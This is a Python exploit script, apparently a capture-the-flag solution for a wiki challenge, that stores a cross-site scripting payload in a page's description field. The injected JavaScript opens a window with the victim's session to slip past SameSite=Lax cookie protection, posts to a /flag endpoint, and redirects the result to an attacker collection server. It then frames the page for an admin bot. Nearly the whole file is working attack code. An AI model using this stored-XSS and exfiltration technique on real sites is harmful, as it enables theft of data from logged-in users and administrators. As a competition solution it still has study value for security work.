#!/usr/bin/env python3

'''
# Summary
- window.open() can open the new window using session
- it can bypass app.config["SESSION_COOKIE_SAMESITE"] = "Lax" to create new window
- use iframe to make site for admin self
'''

import requests

proxies = {
    'http': '127.0.0.1:8081',
    'https': '127.0.0.1:8081'
}

target_ip = "http://192.168.219.100:3337"
cc_server = "http://192.168.219.111:10505"

session = requests.session()

# step 1
burp0_url = target_ip+"/create"
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://ctf-wiki.chall.lac.tf", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://ctf-wiki.chall.lac.tf/create", "Accept-Encoding": "gzip, deflate", "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"}

attack_payload = """
<script>
    w = window.open("{0}");
    w.onload = function(){{
        w.document.body.innerHTML = `<form action="/flag" id="flagForm" method="post"></form>`;
        w.document.getElementById("flagForm").submit();

        setTimeout(() => {{
            console.log(w.document.body.innerText);
            window.location = "{1}"+"/?flag=" +encodeURIComponent(w.document.body.innerText);
        }},99);
    }};
</script>
""".format(target_ip, cc_server)

burp0_data = {"name": "1", "image": "1", "team": "2", "specialty": "2", "website": "2", "description": "{}".format(attack_payload)}
data = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxies, allow_redirects=False)

data = data.text
data = data.split("<a href=\"")[1].split("\">")[0]

# make this data to a.js include <iframe>
jsfile_content = "<iframe src=\""+target_ip+data+"\"></iframe>"
print(jsfile_content)

# use this jsfile_content to make a.html & send to admin bot
url = cc_server+"/a.html"
print(url)